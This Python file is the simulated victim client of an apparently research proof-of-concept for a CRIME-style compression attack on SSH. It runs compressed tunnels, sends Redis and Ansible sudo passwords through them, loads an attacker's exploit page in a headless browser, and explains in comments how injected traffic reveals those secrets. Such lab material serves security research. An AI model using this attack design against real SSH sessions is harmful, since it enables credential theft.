"""SSH client -- OpenSSH subprocess variant of the CRIME-on-SSH PoC.

Scenario
--------
Two attack-target SSH connections live side by side in this container:

1. **Redis tunnel (direct / BEAST variants).**  An OpenSSH subprocess
   ``ssh -N -C -v -L 0.0.0.0:6379:redis:6379`` stays up for the life
   of the container.  The victim's application authenticates to Redis
   with ``AUTH default <password>`` through that tunnel.  The attacker
   injects by connecting to ``client:6379`` (direct variant) or by
   driving a headless Chromium via WebSocket (BEAST variant).

2. **Ansible variant.**  The "victim" periodically runs an
   ansible-playbook with ``become: yes``.  Each playbook invocation
   spawns its own fresh ``ssh`` subprocess that uses the settings in
   ``/root/.ssh/config`` -- including a ``LocalForward`` that the
   user configured for something unrelated (e.g. a forwarded
   database port).  Ansible writes the sudo password to that ssh's
   stdin; OpenSSH wraps it in a single ``SSH_MSG_CHANNEL_DATA``
   packet on the session channel, which is exactly what the attack
   targets.  Each guess is a fresh ansible-playbook run (and
   therefore a fresh SSH connection and a fresh zlib context), so
   there is no compression-window flushing to do.

HTTP control API (for the test harness only -- the attacker never uses
endpoints that reveal the secret):

    GET  /status                 -- SSH state, port-forward info,
                                    ansible state
    POST /send_secret            -- trigger one Redis AUTH cycle
                                    (direct / BEAST variants)
    POST /set_secret             -- change the Redis password and
                                    reconnect the main SSH tunnel
    POST /reset                  -- reconnect the main SSH tunnel
    POST /send_secret_ansible    -- kill any running ansible-playbook,
                                    start a fresh one, and return as
                                    soon as Ansible has written the
                                    sudo password to ssh's stdin
    POST /set_sudo_secret        -- change the victim's sudo password
                                    via a root SSH login to the server
"""

import asyncio
import json
import logging
import os
import signal
import sys
from typing import Optional

import redis.asyncio as aioredis
from aiohttp import web

LOG = logging.getLogger("client")


async def _drain_for_marker(
    stream: Optional[asyncio.StreamReader],
    marker: bytes,
    event: asyncio.Event,
    label: str,
) -> None:
    """Consume lines from *stream*, setting *event* when *marker* is seen.

    Keeps reading after the event is set so the pipe buffer doesn't fill
    and block the subprocess.  Stops on EOF or cancellation.
    """
    if stream is None:
        return
    try:
        while True:
            line = await stream.readline()
            if not line:
                return
            if not event.is_set() and marker in line:
                LOG.debug("[%s] observed password-sent marker", label)
                event.set()
    except (asyncio.CancelledError, OSError):
        pass
    except Exception:  # noqa: BLE001
        LOG.exception("[%s] drain error", label)

# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------

KEYS_DIR = "/keys"
SERVER_HOST_KEY_PUB = os.path.join(KEYS_DIR, "server_host_key.pub")
CLIENT_KEY = os.path.join(KEYS_DIR, "client_user_key")

SSH_TARGET_HOST = os.environ.get("SSH_TARGET_HOST", "attacker")
SSH_TARGET_PORT = int(os.environ.get("SSH_TARGET_PORT", "2222"))
SSH_REAL_SERVER = os.environ.get("SSH_REAL_SERVER", "server")
SSH_USERNAME = os.environ.get("SSH_USERNAME", "victim")
HTTP_PORT = int(os.environ.get("HTTP_PORT", "8000"))

# Port-forward configuration --------------------------------------------------
REDIS_TUNNEL_LOCAL_HOST = "0.0.0.0"
REDIS_TUNNEL_LOCAL_PORT = int(os.environ.get("REDIS_TUNNEL_LOCAL_PORT", "6379"))
REDIS_TUNNEL_DEST_HOST = os.environ.get("REDIS_TUNNEL_DEST_HOST", "redis")
REDIS_TUNNEL_DEST_PORT = int(os.environ.get("REDIS_TUNNEL_DEST_PORT", "6379"))

# Ansible variant port-forward configuration ----------------------------------
# The "user's" /root/.ssh/config gets a LocalForward directive that Ansible
# inherits automatically when it invokes ssh.  The destination is arbitrary
# (any port reachable from the SSH server will do); the point is that the
# forward is a *pre-existing* user config entry, so Ansible runs with it
# without the user realising it.
ANSIBLE_TUNNEL_LOCAL_HOST = "0.0.0.0"
ANSIBLE_TUNNEL_LOCAL_PORT = int(os.environ.get("ANSIBLE_TUNNEL_LOCAL_PORT", "15432"))
ANSIBLE_TUNNEL_DEST_HOST = os.environ.get("ANSIBLE_TUNNEL_DEST_HOST", "redis")
ANSIBLE_TUNNEL_DEST_PORT = int(os.environ.get("ANSIBLE_TUNNEL_DEST_PORT", "6379"))

DEFAULT_SECRET_VALUE = os.environ.get("SECRET_VALUE", "hunter2")
DEFAULT_SUDO_SECRET = os.environ.get("SUDO_SECRET_VALUE", "hunter2")

KNOWN_HOSTS_PATH = "/tmp/known_hosts"
SSH_CONFIG_PATH = "/root/.ssh/config"
ANSIBLE_INVENTORY_PATH = "/app/ansible/inventory.yml"
ANSIBLE_PLAYBOOK_PATH = "/app/ansible/playbook.yml"
ANSIBLE_VARS_PATH = "/tmp/ansible_vars.json"

# Marker emitted by Ansible's ssh connection plugin (plugins/connection/
# ssh.py, line 1296) immediately before the sudo password is written to
# the ssh subprocess's stdin.  Appears once per become-enabled task in
# `-vvv` stdout.  We use it as a "password in flight" signal.
ANSIBLE_PASSWORD_SENT_MARKER = b"Sending become_password in response to prompt"

# Redis username used for ACL-style AUTH (Redis 6+).
# redis-py sends ``AUTH default <password>`` in RESP format.
REDIS_USERNAME = "default"


# ---------------------------------------------------------------------------
# SSH subprocess state
# ---------------------------------------------------------------------------

class SSHState:
    """Manages the OpenSSH client subprocess and its local port forward."""

    def __init__(self, secret_value: str, sudo_secret: str) -> None:
        self.ssh_proc: Optional[asyncio.subprocess.Process] = None
        self.secret_value: str = secret_value
        self.sudo_secret: str = sudo_secret
        self._lock = asyncio.Lock()
        self._negotiated: dict[str, str] = {}
        self._stderr_task: Optional[asyncio.Task] = None
        self._playwright = None
        self._browser = None
        # Ansible variant state ------------------------------------------
        # Only one ansible-playbook runs at a time; a new /send_secret_ansible
        # call always kills the previous one before starting its own.
        self.ansible_proc: Optional[asyncio.subprocess.Process] = None
        self._ansible_lock = asyncio.Lock()
        self._ansible_drain_tasks: list[asyncio.Task] = []

    # -- SSH lifecycle --------------------------------------------------------

    def _write_known_hosts(self) -> None:
        """Build a known_hosts file from the server's public key.

        We pin the *real* server's host key under two names:

        * ``[attacker]:2222`` -- used by the main Redis-tunnel ssh (which
          dials the attacker's TCP forwarder) and by ansible-playbook
          (same route, so the attacker can sniff).
        * ``server`` on port 22 -- used by the /set_sudo_secret helper,
          which SSHes *directly* to the server as root to rotate the
          victim's sudo password.  Going direct keeps the housekeeping
          traffic off the attacker's wire.
        """
        with open(SERVER_HOST_KEY_PUB) as f:
            key_line = f.read().strip()
        lines = [
            f"[{SSH_TARGET_HOST}]:{SSH_TARGET_PORT} {key_line}\n",
            f"{SSH_REAL_SERVER} {key_line}\n",
        ]
        with open(KNOWN_HOSTS_PATH, "w") as f:
            f.writelines(lines)
        LOG.info("wrote known_hosts: %s", KNOWN_HOSTS_PATH)

    def _write_ssh_config(self) -> None:
        """Generate /root/.ssh/config with two Host blocks.

        ``Host ansible-target`` is what ansible-playbook connects to.
        It goes through the attacker's TCP forwarder on purpose (so the
        sniffer sees the traffic) and declares the LocalForward that the
        attack injects through -- exactly the kind of "innocent helper
        port forward the user pasted into their ssh_config and forgot
        about" that the Ansible variant's threat model relies on.

        ``Host server-root`` is what /set_sudo_secret uses to rotate the
        victim's sudo password via chpasswd.  It goes *directly* to the
        server so the sniffer never sees the housekeeping traffic.
        """
        config = (
            "# Auto-generated by client.py at startup -- do not hand-edit.\n"
            "\n"
            "# ansible-target: used by ansible-playbook for the CRIME-on-SSH\n"
            "# Ansible variant.  Goes via the attacker's TCP forwarder so\n"
            "# scapy can see the password CHANNEL_DATA and the injected\n"
            "# CHANNEL_DATA on the same wire.  The LocalForward directive\n"
            "# is inherited automatically by ansible-playbook -- the user\n"
            "# configured it for some unrelated purpose and is unaware it\n"
            "# opens an attack surface while ansible runs.\n"
            "Host ansible-target\n"
            f"    HostName {SSH_TARGET_HOST}\n"
            f"    Port {SSH_TARGET_PORT}\n"
            f"    User {SSH_USERNAME}\n"
            f"    IdentityFile {CLIENT_KEY}\n"
            f"    UserKnownHostsFile {KNOWN_HOSTS_PATH}\n"
            "    StrictHostKeyChecking yes\n"
            f"    LocalForward {ANSIBLE_TUNNEL_LOCAL_HOST}:{ANSIBLE_TUNNEL_LOCAL_PORT} "
            f"{ANSIBLE_TUNNEL_DEST_HOST}:{ANSIBLE_TUNNEL_DEST_PORT}\n"
            "    Compression yes\n"
            "    ControlMaster no\n"
            "    ControlPath none\n"
            "    ServerAliveInterval 60\n"
            "    ServerAliveCountMax 3\n"
            "\n"
            "# server-root: used by /set_sudo_secret to rotate the victim's\n"
            "# sudo password via `chpasswd` over a root SSH login.  Goes\n"
            "# *direct* to the server (bypassing the attacker's forwarder)\n"
            "# so the scapy sniffer never observes this traffic.\n"
            "Host server-root\n"
            f"    HostName {SSH_REAL_SERVER}\n"
            "    Port 22\n"
            "    User root\n"
            f"    IdentityFile {CLIENT_KEY}\n"
            f"    UserKnownHostsFile {KNOWN_HOSTS_PATH}\n"
            "    StrictHostKeyChecking yes\n"
            "    Compression no\n"
            "    BatchMode yes\n"
        )
        os.makedirs("/root/.ssh", exist_ok=True)
        os.chmod("/root/.ssh", 0o700)
        with open(SSH_CONFIG_PATH, "w") as f:
            f.write(config)
        os.chmod(SSH_CONFIG_PATH, 0o600)
        LOG.info("wrote ssh config: %s", SSH_CONFIG_PATH)

    def _build_ssh_cmd(self) -> list[str]:
        redis_fwd = (
            f"{REDIS_TUNNEL_LOCAL_HOST}:{REDIS_TUNNEL_LOCAL_PORT}:"
            f"{REDIS_TUNNEL_DEST_HOST}:{REDIS_TUNNEL_DEST_PORT}"
        )
        return [
            "ssh",
            "-N",                                           # no remote command
            "-C",                                           # enable compression
            "-v",                                           # verbose (parse negotiated algs)
            "-o", "StrictHostKeyChecking=yes",
            "-o", f"UserKnownHostsFile={KNOWN_HOSTS_PATH}",
            "-o", "ExitOnForwardFailure=yes",
            "-o", "ServerAliveInterval=60",
            "-o", "ServerAliveCountMax=3",
            "-i", CLIENT_KEY,
            "-L", redis_fwd,
            "-p", str(SSH_TARGET_PORT),
            f"{SSH_USERNAME}@{SSH_TARGET_HOST}",
        ]

    async def connect(self) -> None:
        """Launch ssh subprocess with port forwards."""
        self._write_known_hosts()
        self._write_ssh_config()
        cmd = self._build_ssh_cmd()
        LOG.info("launching: %s", " ".join(cmd))
        self.ssh_proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.DEVNULL,
            stderr=asyncio.subprocess.PIPE,
        )
        # Parse negotiated algorithms from ssh -v stderr
        self._negotiated = await self._parse_kex(timeout=15)
        LOG.info("negotiated: %s", self._negotiated)
        # Start a background task to drain stderr so the pipe never fills
        # and blocks the ssh process.
        self._stderr_task = asyncio.create_task(self._drain_stderr())
        # Wait for tunnels to accept connections
        await self._wait_for_tunnels(timeout=15)
        LOG.info("SSH tunnels ready")

    async def _drain_stderr(self) -> None:
        """Read and discard ssh -v stderr to prevent pipe buffer deadlock."""
        assert self.ssh_proc is not None and self.ssh_proc.stderr is not None
        try:
            while True:
                line = await self.ssh_proc.stderr.readline()
                if not line:
                    break
        except (asyncio.CancelledError, OSError):
            pass

    async def _parse_kex(self, timeout: float = 15) -> dict[str, str]:
        """Read ssh -v stderr until kex lines appear or authentication completes."""
        info: dict[str, str] = {}
        deadline = asyncio.get_event_loop().time() + timeout
        assert self.ssh_proc is not None
        assert self.ssh_proc.stderr is not None
        while asyncio.get_event_loop().time() < deadline:
            try:
                line_bytes = await asyncio.wait_for(
                    self.ssh_proc.stderr.readline(), timeout=1.0,
                )
            except asyncio.TimeoutError:
                if info:
                    break
                continue
            if not line_bytes:
                break
            line = line_bytes.decode("utf-8", errors="replace").strip()
            LOG.debug("ssh: %s", line)
            # debug1: kex: server->client cipher: ... compression: ...
            if "kex: client->server" in line or "kex: server->client" in line:
                direction = "send" if "client->server" in line else "recv"
                for field in ("cipher:", "compression:", "MAC:"):
                    if field in line:
                        val = line.split(field, 1)[1].strip().split()[0]
                        key = f"{direction}_{field.rstrip(':')}"
                        info[key] = val
            if "Authentication succeeded" in line or "pledge:" in line:
                break
        return info

    async def _wait_for_tunnels(self, timeout: float = 30) -> None:
        """Poll local port until the Redis tunnel accepts connections."""
        deadline = asyncio.get_event_loop().time() + timeout
        while asyncio.get_event_loop().time() < deadline:
            if self.ssh_proc and self.ssh_proc.returncode is not None:
                raise RuntimeError(
                    f"ssh exited with code {self.ssh_proc.returncode}"
                )
            try:
                _, w = await asyncio.open_connection(
                    "127.0.0.1", REDIS_TUNNEL_LOCAL_PORT,
                )
                w.close()
                await w.wait_closed()
                LOG.info("Redis tunnel listening on %s:%d",
                         REDIS_TUNNEL_LOCAL_HOST, REDIS_TUNNEL_LOCAL_PORT)
                return
            except OSError:
                await asyncio.sleep(0.3)
        raise TimeoutError(f"Redis tunnel not ready after {timeout}s")

    async def reconnect(self) -> None:
        """Kill ssh, re-launch with a fresh compression context."""
        LOG.info("reconnecting (resets SSH compression context)")
        await self._kill_ssh()
        await self.connect()

    async def _kill_ssh(self) -> None:
        if self._stderr_task and not self._stderr_task.done():
            self._stderr_task.cancel()
            self._stderr_task = None
        if self.ssh_proc and self.ssh_proc.returncode is None:
            self.ssh_proc.terminate()
            try:
                await asyncio.wait_for(self.ssh_proc.wait(), timeout=5)
            except asyncio.TimeoutError:
                self.ssh_proc.kill()
                await self.ssh_proc.wait()
        self.ssh_proc = None
        self._negotiated = {}

    # -- Redis interaction ---------------------------------------------------

    async def init_redis_password(self) -> None:
        """Set the initial Redis password (Redis starts with none)."""
        for attempt in range(1, 21):
            try:
                r = aioredis.Redis(
                    host="127.0.0.1", port=REDIS_TUNNEL_LOCAL_PORT,
                    socket_connect_timeout=5,
                )
                await r.config_set("requirepass", self.secret_value)
                await r.aclose()
                LOG.info("initial CONFIG SET requirepass: OK")
                return
            except (OSError, aioredis.RedisError) as exc:
                LOG.warning("Redis init attempt %d: %s", attempt, exc)
                await asyncio.sleep(0.5)
        LOG.error("could not set initial Redis password after retries")

    async def send_secret(self) -> int:
        """Simulate the application connecting to Redis and authenticating.

        Opens a fresh redis-py connection through the tunnel; redis-py
        sends ``AUTH default <password>`` in RESP format.  The connection
        is closed afterwards, just like a short-lived pool checkout.
        """
        async with self._lock:
            r = aioredis.Redis(
                host="127.0.0.1", port=REDIS_TUNNEL_LOCAL_PORT,
                username=REDIS_USERNAME,
                password=self.secret_value,
                socket_connect_timeout=5,
            )
            try:
                await r.ping()
                LOG.info("Redis AUTH+PING: OK")
            finally:
                await r.aclose()
        return 0

    async def reconfigure_redis(self, new_password: str) -> None:
        """Change the Redis requirepass at runtime via CONFIG SET."""
        r = aioredis.Redis(
            host="127.0.0.1", port=REDIS_TUNNEL_LOCAL_PORT,
            username=REDIS_USERNAME,
            password=self.secret_value,
            socket_connect_timeout=5,
        )
        try:
            await r.config_set("requirepass", new_password)
            LOG.info("Redis CONFIG SET requirepass: OK")
        finally:
            await r.aclose()

    # -- Ansible variant ------------------------------------------------------

    async def set_sudo_password(self, new_password: str) -> None:
        """SSH to the server as root and change the victim's sudo password.

        The server's /etc/sudoers.d/victim entry requires a password for
        sudo; the PoC attack target is exactly that password (which the
        Ansible become plugin writes to ssh's stdin on every become
        task).  This helper lets the test harness rotate the password
        between runs the same way the Redis variant rotates the Redis
        password via ``CONFIG SET requirepass``.

        It also waits for any currently running ansible-playbook to
        exit naturally (or kills it if stuck), since that subprocess
        would still be holding the old password in memory.
        """
        async with self._ansible_lock:
            await self._kill_ansible_locked()
        if "\n" in new_password or "\r" in new_password:
            raise ValueError("sudo password must not contain newlines")
        ssh_cmd = [
            "ssh", "-F", SSH_CONFIG_PATH, "server-root",
            "chpasswd",
        ]
        LOG.info("set_sudo_password: SSHing to server-root to run chpasswd")
        proc = await asyncio.create_subprocess_exec(
            *ssh_cmd,
            stdin=asyncio.subprocess.PIPE,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        stdin_data = f"victim:{new_password}\n".encode("utf-8")
        stdout, stderr = await proc.communicate(input=stdin_data)
        if proc.returncode != 0:
            raise RuntimeError(
                "chpasswd failed (rc=%d): stdout=%r stderr=%r" % (
                    proc.returncode, stdout, stderr,
                )
            )
        self.sudo_secret = new_password
        LOG.info("sudo password rotated (length=%d)", len(new_password))

    async def _kill_ansible_locked(self) -> None:
        """Terminate a running ansible-playbook subprocess, if any.

        Caller must hold ``self._ansible_lock``.  With ControlMaster
        disabled, the SSH slave that ansible-playbook spawned is the
        only thing holding the LocalForward port binding, and the
        next iteration wants that port to be free the instant it
        starts its own ansible-playbook.  We therefore kill the whole
        process group (ansible-playbook + its children including the
        ssh slave) with SIGTERM, falling back to SIGKILL if the group
        doesn't exit promptly.
        """
        proc = self.ansible_proc
        if proc is None:
            return
        if proc.returncode is None:
            try:
                os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
            except ProcessLookupError:
                pass
            try:
                await asyncio.wait_for(proc.wait(), timeout=3.0)
            except asyncio.TimeoutError:
                LOG.warning("ansible-playbook did not exit on SIGTERM, sending SIGKILL")
                try:
                    os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
                except ProcessLookupError:
                    pass
                await proc.wait()
        for task in self._ansible_drain_tasks:
            if not task.done():
                task.cancel()
        # Let the cancellations propagate so the pipes can close cleanly.
        for task in self._ansible_drain_tasks:
            try:
                await task
            except (asyncio.CancelledError, Exception):  # noqa: BLE001
                pass
        self._ansible_drain_tasks = []
        self.ansible_proc = None

    async def send_secret_ansible(self, timeout: float = 20.0) -> dict:
        """Wait for any previous ansible-playbook run to exit, start a
        fresh one, and return as soon as Ansible has written the sudo
        password to ssh's stdin.

        The playbook's only task is ``raw: 'true'``, which exits as
        soon as sudo validates the password (so the previous run
        is typically already gone by the time the next call arrives,
        but this helper still blocks on its exit when it isn't --
        see ``_wait_for_previous_ansible_locked`` for why that matters
        for session-channel numbering).  With SSH ControlMaster enabled
        the SSH transport (and its LocalForward) outlive every
        ansible-playbook run via ControlPersist, so the attacker's
        measure tunnel can keep injecting into the same zlib
        compression context without re-handshaking.
        """
        async with self._ansible_lock:
            await self._kill_ansible_locked()

            # Write an extra-vars file with the current sudo password.
            # Using a file (mode 0o600) instead of --extra-vars on argv
            # keeps the password out of `ps`.
            with open(ANSIBLE_VARS_PATH, "w") as f:
                json.dump({"ansible_become_password": self.sudo_secret}, f)
            os.chmod(ANSIBLE_VARS_PATH, 0o600)

            env = os.environ.copy()
            env["ANSIBLE_CONFIG"] = "/app/ansible/ansible.cfg"
            env["PYTHONUNBUFFERED"] = "1"
            env["ANSIBLE_FORCE_COLOR"] = "0"
            # Enables display.debug() in Ansible, which is the code
            # path that fires the "Sending become_password in response
            # to prompt" marker we detect below.  Without ANSIBLE_DEBUG
            # that line never reaches stdout regardless of -vvv.
            env["ANSIBLE_DEBUG"] = "1"

            cmd = [
                "ansible-playbook",
                "-vvv",
                "-i", ANSIBLE_INVENTORY_PATH,
                "--extra-vars", f"@{ANSIBLE_VARS_PATH}",
                ANSIBLE_PLAYBOOK_PATH,
            ]
            # Debug-level: the Ansible variant fires a fresh ansible-playbook
            # subprocess per attack iteration and we don't want to log each
            # one.  Kept visible via `docker compose logs client` in DEBUG mode.
            LOG.debug("send_secret_ansible: launching %s", " ".join(cmd))

            self.ansible_proc = await asyncio.create_subprocess_exec(
                *cmd,
                stdin=asyncio.subprocess.DEVNULL,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                env=env,
                # Own process group so killpg() in _kill_ansible_locked
                # cascades to the ssh slave and any other children.
                start_new_session=True,
            )

            # Drain both streams, looking for the "password sent" marker
            # in whichever stream Ansible happens to write it to.
            password_sent = asyncio.Event()
            self._ansible_drain_tasks = [
                asyncio.create_task(
                    _drain_for_marker(
                        self.ansible_proc.stdout,
                        ANSIBLE_PASSWORD_SENT_MARKER,
                        password_sent,
                        "ansible-stdout",
                    ),
                ),
                asyncio.create_task(
                    _drain_for_marker(
                        self.ansible_proc.stderr,
                        ANSIBLE_PASSWORD_SENT_MARKER,
                        password_sent,
                        "ansible-stderr",
                    ),
                ),
            ]

            # Also guard against ansible dying before the marker
            # (e.g. wrong password, connection refused, ...).
            exit_task = asyncio.create_task(self.ansible_proc.wait())
            marker_task = asyncio.create_task(password_sent.wait())
            try:
                done, _ = await asyncio.wait(
                    {exit_task, marker_task},
                    timeout=timeout,
                    return_when=asyncio.FIRST_COMPLETED,
                )
            finally:
                pass
            if marker_task in done:
                exit_task.cancel()
                # Small settle so the CHANNEL_DATA finishes travelling
                # ssh(subprocess) -> kernel socket -> wire -> sniffer.
                await asyncio.sleep(0.1)
                LOG.debug("send_secret_ansible: password marker observed")
                return {
                    "ok": True,
                    "marker": "password_sent",
                    "sudo_password_length": len(self.sudo_secret),
                }
            # Didn't see the marker.  Either ansible exited (rc != 0,
            # probably wrong password / sudo failure) or we timed out.
            marker_task.cancel()
            if exit_task.done():
                rc = self.ansible_proc.returncode
                await self._kill_ansible_locked()
                raise RuntimeError(
                    f"ansible-playbook exited (rc={rc}) before "
                    f"writing the become password -- wrong sudo "
                    f"password, connection refused, or config error"
                )
            # Timeout: kill and bail out.
            await self._kill_ansible_locked()
            raise asyncio.TimeoutError(
                f"ansible-playbook did not reach the 'Sending "
                f"become_password' marker within {timeout:.1f}s"
            )

    # -- Browser automation (BEAST variant) ------------------------------------

    async def launch_browser(self) -> None:
        """Launch headless Firefox and load the attacker's exploit page.

        Firefox is used because Chromium/WebKit PNA would preflight the
        cross-origin sendBeacon to the loopback tunnel and strip its body.
        """
        from playwright.async_api import async_playwright

        self._playwright = await async_playwright().start()
        self._browser = await self._playwright.firefox.launch(headless=True)
        page = await self._browser.new_page()

        exploit_url = "http://attacker:9000/exploit"
        for attempt in range(1, 61):
            try:
                resp = await page.goto(exploit_url, timeout=5000)
                if resp and resp.ok:
                    LOG.info("browser loaded exploit page from attacker")
                    return
            except Exception as exc:  # noqa: BLE001
                if attempt % 10 == 0:
                    LOG.warning("browser navigate attempt %d: %s", attempt, exc)
                await asyncio.sleep(1.0)
        LOG.error("could not load exploit page after 60 attempts")

    def status(self) -> dict:
        ansible_alive = (
            self.ansible_proc is not None
            and self.ansible_proc.returncode is None
        )
        if self.ssh_proc is None or self.ssh_proc.returncode is not None:
            return {
                "ssh_connected": False,
                "ansible_proc_alive": ansible_alive,
                "sudo_secret_length": len(self.sudo_secret),
            }
        return {
            "ssh_connected": True,
            "ssh_target": f"{SSH_TARGET_HOST}:{SSH_TARGET_PORT}",
            "ssh_real_server": SSH_REAL_SERVER,
            "ssh_username": SSH_USERNAME,
            "ssh_send_compression": self._negotiated.get(
                "send_compression", "unknown"),
            "ssh_recv_compression": self._negotiated.get(
                "recv_compression", "unknown"),
            "ssh_send_cipher": self._negotiated.get(
                "send_cipher", "unknown"),
            "ssh_recv_cipher": self._negotiated.get(
                "recv_cipher", "unknown"),
            "ssh_send_mac": self._negotiated.get("send_MAC", "unknown"),
            "ssh_recv_mac": self._negotiated.get("recv_MAC", "unknown"),
            "port_forwards": {
                "redis_tunnel": {
                    "active": True,
                    "local": f"{REDIS_TUNNEL_LOCAL_HOST}:{REDIS_TUNNEL_LOCAL_PORT}",
                    "remote": f"{REDIS_TUNNEL_DEST_HOST}:{REDIS_TUNNEL_DEST_PORT}",
                },
                "ansible_tunnel": {
                    "active": True,
                    "local": f"{ANSIBLE_TUNNEL_LOCAL_HOST}:{ANSIBLE_TUNNEL_LOCAL_PORT}",
                    "remote": f"{ANSIBLE_TUNNEL_DEST_HOST}:{ANSIBLE_TUNNEL_DEST_PORT}",
                    "source": "ansible-playbook (per /send_secret_ansible call)",
                },
            },
            "secret_value_length": len(self.secret_value),
            "sudo_secret_length": len(self.sudo_secret),
            "ansible_proc_alive": ansible_alive,
            "browser_connected": self._browser is not None,
        }


# ---------------------------------------------------------------------------
# HTTP control plane
# ---------------------------------------------------------------------------


async def handle_status(request: web.Request) -> web.Response:
    state: SSHState = request.app["ssh"]
    return web.json_response(state.status())


async def handle_send_secret(request: web.Request) -> web.Response:
    state: SSHState = request.app["ssh"]
    try:
        n = await state.send_secret()
    except Exception as exc:  # noqa: BLE001
        LOG.exception("send_secret failed")
        return web.json_response({"ok": False, "error": str(exc)}, status=500)
    return web.json_response({"ok": True, "bytes_written": n})


async def handle_set_secret(request: web.Request) -> web.Response:
    state: SSHState = request.app["ssh"]
    body = await request.json()
    new_value = body.get("value")
    if not isinstance(new_value, str):
        return web.json_response(
            {"ok": False, "error": "missing string 'value'"}, status=400,
        )
    LOG.info("set_secret: new value length %d", len(new_value))
    try:
        await state.reconfigure_redis(new_value)
        state.secret_value = new_value
        await state.reconnect()
    except Exception as exc:  # noqa: BLE001
        LOG.exception("set_secret failed")
        return web.json_response({"ok": False, "error": str(exc)}, status=500)
    return web.json_response({
        "ok": True,
        "secret_value_length": len(new_value),
    })


async def handle_reset(request: web.Request) -> web.Response:
    state: SSHState = request.app["ssh"]
    await state.reconnect()
    return web.json_response({"ok": True})


async def handle_send_secret_ansible(request: web.Request) -> web.Response:
    state: SSHState = request.app["ssh"]
    try:
        result = await state.send_secret_ansible()
    except asyncio.TimeoutError as exc:
        LOG.exception("send_secret_ansible timed out")
        return web.json_response(
            {"ok": False, "error": str(exc)}, status=504,
        )
    except Exception as exc:  # noqa: BLE001
        LOG.exception("send_secret_ansible failed")
        return web.json_response(
            {"ok": False, "error": str(exc)}, status=500,
        )
    return web.json_response(result)


async def handle_set_sudo_secret(request: web.Request) -> web.Response:
    state: SSHState = request.app["ssh"]
    body = await request.json()
    new_value = body.get("value")
    if not isinstance(new_value, str):
        return web.json_response(
            {"ok": False, "error": "missing string 'value'"}, status=400,
        )
    LOG.info("set_sudo_secret: new value length %d", len(new_value))
    try:
        await state.set_sudo_password(new_value)
    except Exception as exc:  # noqa: BLE001
        LOG.exception("set_sudo_secret failed")
        return web.json_response({"ok": False, "error": str(exc)}, status=500)
    return web.json_response({
        "ok": True,
        "sudo_secret_length": len(new_value),
    })


async def main() -> int:
    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s %(name)s %(levelname)s %(message)s",
    )
    # Silence the per-request aiohttp access log -- the Ansible variant
    # fires a /send_secret_ansible per attack iteration and each one would
    # otherwise add a noisy line to `docker compose logs client`.
    logging.getLogger("aiohttp.access").setLevel(logging.WARNING)

    state = SSHState(
        secret_value=DEFAULT_SECRET_VALUE,
        sudo_secret=DEFAULT_SUDO_SECRET,
    )

    for attempt in range(1, 21):
        try:
            await state.connect()
            break
        except (OSError, RuntimeError, TimeoutError) as exc:
            LOG.warning("connect attempt %d failed: %s", attempt, exc)
            await state._kill_ssh()
            await asyncio.sleep(1.0)
    else:
        LOG.error("could not establish SSH transport after retries")
        return 1

    await state.init_redis_password()

    # Set the initial victim sudo password via a root SSH + chpasswd so
    # that the first /send_secret_ansible call has something to send.
    # sshd must already be up (the main SSH connect above proves it).
    for attempt in range(1, 11):
        try:
            await state.set_sudo_password(DEFAULT_SUDO_SECRET)
            break
        except (OSError, RuntimeError) as exc:
            LOG.warning("initial set_sudo_password attempt %d: %s", attempt, exc)
            await asyncio.sleep(1.0)
    else:
        LOG.error("could not set initial sudo password after retries")

    app = web.Application()
    app["ssh"] = state
    app.router.add_get("/status", handle_status)
    app.router.add_post("/send_secret", handle_send_secret)
    app.router.add_post("/set_secret", handle_set_secret)
    app.router.add_post("/reset", handle_reset)
    app.router.add_post("/send_secret_ansible", handle_send_secret_ansible)
    app.router.add_post("/set_sudo_secret", handle_set_sudo_secret)

    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", HTTP_PORT)
    await site.start()
    LOG.info("HTTP control API listening on 0.0.0.0:%d", HTTP_PORT)

    # Launch browser for the BEAST attack variant.
    try:
        await state.launch_browser()
    except Exception as exc:  # noqa: BLE001
        LOG.warning("browser launch failed (BEAST variant unavailable): %s", exc)

    await asyncio.Event().wait()
    return 0


if __name__ == "__main__":
    try:
        sys.exit(asyncio.run(main()))
    except (KeyboardInterrupt, SystemExit):
        pass
